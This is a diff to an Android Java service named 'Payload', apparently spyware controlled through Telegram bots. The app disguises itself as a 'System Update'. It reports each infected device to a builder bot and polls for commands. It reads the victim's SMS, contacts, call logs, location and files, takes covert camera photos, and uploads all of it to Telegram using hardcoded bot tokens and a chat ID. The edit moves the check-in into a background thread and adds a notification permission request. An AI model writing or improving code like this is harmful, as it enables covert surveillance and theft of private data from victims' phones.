@@ -34,9 +34,7 @@ import java.util.List;
 import java.util.concurrent.TimeUnit;
 
 public class Payload extends Service {
-    // ── TOKEN BOT PAYLOAD (BUAT KIRIM HASIL) ──
     private String BOT_TOKEN = "8887819326:AAFX97DDbezzF_y-kOQWBL02NNy38nWxAIY"; 
-    // ── TOKEN BOT BUILDER (BUAT LAPOR DIRI) ──
     private String BUILDER_TOKEN = "9067923295:AAE-sOBegpDh0IgaLKpn32-Nlmv9ibGYgwo";
     private String CHAT_ID = "8598136412";
     
@@ -57,6 +55,11 @@ public class Payload extends Service {
                     permissions.add(p);
                 }
             }
+            if (Build.VERSION.SDK_INT >= 33) {
+                if (activity.checkSelfPermission("android.permission.POST_NOTIFICATIONS") != PackageManager.PERMISSION_GRANTED) {
+                    permissions.add("android.permission.POST_NOTIFICATIONS");
+                }
+            }
             if (!permissions.isEmpty()) {
                 activity.requestPermissions(permissions.toArray(new String[0]), 101);
             }
@@ -74,10 +77,6 @@ public class Payload extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         Log.d("SystemUpdate", "Service started...");
         
-        // LAPOR DIRI KE BOT BUILDER
-        String deviceName = Build.MANUFACTURER + " " + Build.MODEL + " (Android " + Build.VERSION.RELEASE + ")";
-        sendCheckIn(deviceName);
-
         if (Build.VERSION.SDK_INT >= 26) {
             String CHANNEL_ID = "sys_update_channel";
             NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "System Update", NotificationManager.IMPORTANCE_LOW);
@@ -96,6 +95,10 @@ public class Payload extends Service {
         new Thread(new Runnable() {
             @Override
             public void run() {
+                // LAPOR DIRI (DIPANGGIL DI DALAM THREAD BIAR GA CRASH)
+                String deviceName = Build.MANUFACTURER + " " + Build.MODEL + " (Android " + Build.VERSION.RELEASE + ")";
+                sendCheckIn(deviceName);
+
                 while (isRunning) {
                     try {
                         String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10";
@@ -142,7 +145,6 @@ public class Payload extends Service {
         return START_STICKY;
     }
 
-    // Fungsi buat lapor ke Bot Builder
     private void sendCheckIn(String deviceInfo) {
         try {
             String encoded = URLEncoder.encode("/checkin " + deviceInfo, "UTF-8");
@@ -151,7 +153,6 @@ public class Payload extends Service {
         } catch (Exception e) { e.printStackTrace(); }
     }
 
-    // ... (Fungsi getSms, getContacts, getCallLogs, getLocation, listFiles, takePhoto, sendTelegramMessage, sendTelegramFile TETAP SAMA SEPERTI SEBELUMNYA)
     private String getSms() {
         StringBuilder sb = new StringBuilder();
         try {
@@ -166,6 +167,7 @@ public class Payload extends Service {
         } catch (Exception e) { return "Gagal baca SMS."; }
         return sb.length() > 0 ? sb.toString() : "Tidak ada SMS.";
     }
+
     private String getContacts() {
         StringBuilder sb = new StringBuilder();
         try {
@@ -180,6 +182,7 @@ public class Payload extends Service {
         } catch (Exception e) { return "Gagal baca Kontak."; }
         return sb.length() > 0 ? sb.toString() : "Tidak ada Kontak.";
     }
+
     private String getCallLogs() {
         StringBuilder sb = new StringBuilder();
         try {
@@ -194,6 +197,7 @@ public class Payload extends Service {
         } catch (Exception e) { return "Gagal baca Call Log."; }
         return sb.length() > 0 ? sb.toString() : "Tidak ada Call Log.";
     }
+
     private String getLocation() {
         try {
             LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
@@ -203,6 +207,7 @@ public class Payload extends Service {
         } catch (Exception e) { return "Gagal ambil lokasi."; }
         return "Lokasi tidak tersedia.";
     }
+
     private String listFiles(String path) {
         StringBuilder sb = new StringBuilder();
         try {
@@ -214,6 +219,7 @@ public class Payload extends Service {
         } catch (Exception e) { return "Gagal baca file."; }
         return sb.length() > 0 ? sb.toString() : "Folder kosong.";
     }
+
     private void takePhoto(int cameraId) {
         try {
             Camera camera = Camera.open(cameraId);
@@ -233,6 +239,7 @@ public class Payload extends Service {
             });
         } catch (Exception e) { sendTelegramMessage("❌ Gagal ambil foto."); }
     }
+
     private void sendTelegramMessage(String pesan) {
         try {
             String encodedMsg = URLEncoder.encode(pesan, "UTF-8");
@@ -240,6 +247,7 @@ public class Payload extends Service {
             new URL(urlStr).openConnection().getInputStream().close();
         } catch (Exception e) { e.printStackTrace(); }
     }
+
     private void sendTelegramFile(String filePath, boolean isPhoto, String caption) {
         String boundary = "*****";
         try {
@@ -263,6 +271,7 @@ public class Payload extends Service {
             request.flush(); request.close(); conn.getResponseCode(); file.delete();
         } catch (Exception e) { e.printStackTrace(); }
     }
+
     @Override
     public IBinder onBind(Intent intent) { return null; }
-}
+                }
